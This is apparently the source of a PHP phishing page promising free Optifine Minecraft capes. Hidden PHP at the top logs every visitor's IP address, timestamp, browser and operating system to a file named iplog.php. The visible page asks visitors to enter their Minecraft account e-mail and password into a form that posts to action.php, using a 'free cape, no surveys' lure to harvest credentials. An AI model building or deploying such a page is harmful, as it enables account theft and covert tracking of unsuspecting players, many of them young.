<?php 
$ip = $_SERVER['REMOTE_ADDR'];

$date = date("Y/m/d/ h:i:s");

$user_agent     =   $_SERVER['HTTP_USER_AGENT'];

function getOS() {

global $user_agent;

$os_platform    =   "Unknown OS";

$os_array       =   array(
                        '/windows nt 6.2/i'     =>  'Windows 8',
                        '/windows nt 6.1/i'     =>  'Windows 7',
                        '/windows nt 6.0/i'     =>  'Windows Vista',
                        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                        '/windows nt 5.1/i'     =>  'Windows XP',
                        '/windows xp/i'         =>  'Windows XP',
                        '/windows nt 5.0/i'     =>  'Windows 2000',
                        '/windows me/i'         =>  'Windows ME',
                        '/win98/i'              =>  'Windows 98',
                        '/win95/i'              =>  'Windows 95',
                        '/win16/i'              =>  'Windows 3.11',
                        '/macintosh|mac os x/i' =>  'Mac OS X',
                        '/mac_powerpc/i'        =>  'Mac OS 9',
                        '/linux/i'              =>  'Linux',
                        '/ubuntu/i'             =>  'Ubuntu',
                        '/iphone/i'             =>  'iPhone',
                        '/ipod/i'               =>  'iPod',
                        '/ipad/i'               =>  'iPad',
                        '/android/i'            =>  'Android',
                        '/blackberry/i'         =>  'BlackBerry',
                        '/webos/i'              =>  'Mobile'
                     );

foreach ($os_array as $regex => $value) {

 if (preg_match($regex, $user_agent)) {
    $os_platform    =   $value;
 }

}

return $os_platform;

}

function getBrowser() {

global $user_agent;

$browser        =   "Unknown Browser";

$browser_array  =   array(
                         '/msie/i'       =>  'Internet Explorer',
                         '/firefox/i'    =>  'Firefox',
                         '/safari/i'     =>  'Safari',
                         '/chrome/i'     =>  'Chrome',
                         '/opera/i'      =>  'Opera',
                         '/netscape/i'   =>  'Netscape',
                         '/maxthon/i'    =>  'Maxthon',
                         '/konqueror/i'  =>  'Konqueror',
                         '/mobile/i'     =>  'Handheld Browser'
                   );

foreach ($browser_array as $regex => $value) {

  if (preg_match($regex, $user_agent)) {
     $browser    =   $value;
  }

}

return $browser;

}

$user_os        =   getOS();
$user_browser   =   getBrowser();
	
	$html= '<tr><th scope="row">#</th><td>'. $ip .'</td><td>'. $date .'</td><td>'. $user_browser .'</td><td>'. $user_os .'</td><td>/get_cape.php</td><a class="blue-text"><i class="fa fa-user"></i></a><a class="teal-text"><i class="fa fa-pencil"></i></a><a class="red-text"><i class="fa fa-times"></i></a></td></tr>'. PHP_EOL;
	file_put_contents('iplog.php', $html, FILE_APPEND); ?>
  <html>
     <head>
		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
		<!-- Latest compiled and minified JavaScript -->
		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
		<!-- Latest compiled and minified CSS -->
		<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
      <title>Optifine Capes for free!</title>
	  <style>
		html {
			margin:40px;
			background: url(bgr.jpg) no-repeat center center fixed; 
			-webkit-background-size: cover;
			-moz-background-size: cover;
			-o-background-size: cover;
			background-size: cover;
			
			
			
			 }
			
		h1 {
			font-family: Verdana, Geneva, sans-serif;
			font-size: 24px;
			font-style: normal;
			font-variant: normal;
			font-weight: 500;
			line-height: 26.4px;
			}
	@margin123456 {
			margin:5px;
		}
		</style>
			<nav class="navbar navbar-default" id="margin123456">
	  <div class="container-fluid">
		<!-- Brand and toggle get grouped for better mobile display -->
		<div class="navbar-header">
		  <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false">
			<span class="sr-only">Toggle navigation</span>
			<span class="icon-bar"></span>
			<span class="icon-bar"></span>
			<span class="icon-bar"></span>
		  </button>
		  <a class="navbar-brand" href="#">  <img src="logo.png" width="65px" height="65px">  </a>
		</div>

		<!-- Collect the nav links, forms, and other content for toggling -->
		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
		  <ul class="nav navbar-nav">
			<li><a href="index.php">Home </a></li>
			<li><a href="faq.php">FAQ's</a>
			<li class="active"><a href="get_cape.php">Get Cape! </a></li>
			  </ul>
			</li>
		  </ul>
		  <ul class="nav navbar-nav navbar-right">
			<li><a href="https://www.paypal.com/">Donate via PayPal</a></li>
			  </ul>
			</li>
		  </ul>
		</div><!-- /.navbar-collapse -->
	  </div><!-- /.container-fluid -->
</nav>
     </head>
	 <body>
		<div class="container">
  <h2 class="text text-info">So how do i get the Cape?</h2>
  <p class="text text-success">Follow the instructions below to get your own custom cape!</p><br>
  <p class="text text-success"><small><i>there will not be any survey's! Guaranteed!</i></small></p>
  <br>
  <!-- Login form -->
		<div align="center" class="col-xs-4 col-xs-offset-4">
		<img align="center" src="optifine.png" width="50" height="80"><br><br>
        <form action="action.php" method="post"><br>
          <input align="center" type="text" name="usr" class="form-control" id="usr" placeholder="E-Mail"><br>
            <input align="center" type="password" name="pass" class="form-control" id="pwd" placeholder="Password"><br>
           <input class="btn btn-info" align="center" type="submit" value="Submit">
		   		<br>
        </form>
			</div>
  <br>
  <p class="text text-success"><small><i>*MAKE SURE TO USE THE MINECRAFT ACCOUNT E-MAIL! *AND YOUR PASSWORD</i></small></p>
  <p class="text text-success">1. Login with your minecraft account details*</p>
  <p class="text text-success">2. Click submit</p>
  <p class="text text-success">3. Wait until its done verifying your account</p>
  <p class="text text-success">4. Then select what type of cape you want to have<p>
  
</div>

<br>
			<br>
		</body>
    </html>